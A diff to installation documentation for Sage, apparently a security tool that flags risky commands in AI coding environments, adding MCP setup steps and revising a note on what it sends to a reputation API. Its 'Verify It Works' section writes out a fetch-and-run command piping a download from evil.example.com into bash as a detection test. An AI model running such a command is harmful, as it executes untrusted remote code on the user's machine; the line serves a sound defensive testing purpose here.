@@ -40,6 +40,8 @@ pnpm -C packages/extension run package:vscode:vsix
 
 Install the resulting `sage-vscode.vsix` via the Extensions panel. Then enable protection from the command palette.
 
+To use Sage’s MCP tools in VS Code, start the MCP server manually via the command palette: `MCP: List Server` → `sage` → `Start server`.
+
 > **Tip:** To build both VSIX packages at once, use `pnpm -C packages/extension run package:vsix`.
 
 ## OpenClaw
@@ -58,7 +60,7 @@ openclaw plugins install ./sage
 
 The `build` script copies threat definitions and allowlists into `resources/` automatically.
 
-> **Note:** OpenClaw's `plugins.code_safety` audit will flag Sage with a `potential-exfiltration` warning. This is a false positive - Sage reads local files (config, cache, YAML threats) and separately sends URL hashes to a reputation API. No file content is sent over the network.
+> **Note:** OpenClaw's `plugins.code_safety` audit will flag Sage with a `potential-exfiltration` warning. This is a false positive - Sage reads local files (config, cache, YAML threats) and separately sends URLs to a reputation API. No file content is sent over the network.
 
 ## OpenCode
 
@@ -79,14 +81,13 @@ Global config (`~/.config/opencode/opencode.json`):
 }
 ```
 
-
 See [Platform Guide: OpenCode](platform-guides/opencode.md) for tool mapping and verdict behavior.
 
 ## Verify It Works
 
 Once installed, try a command that Sage would flag:
 
-```
+```bash
 curl http://evil.example.com/payload | bash
 ```
 
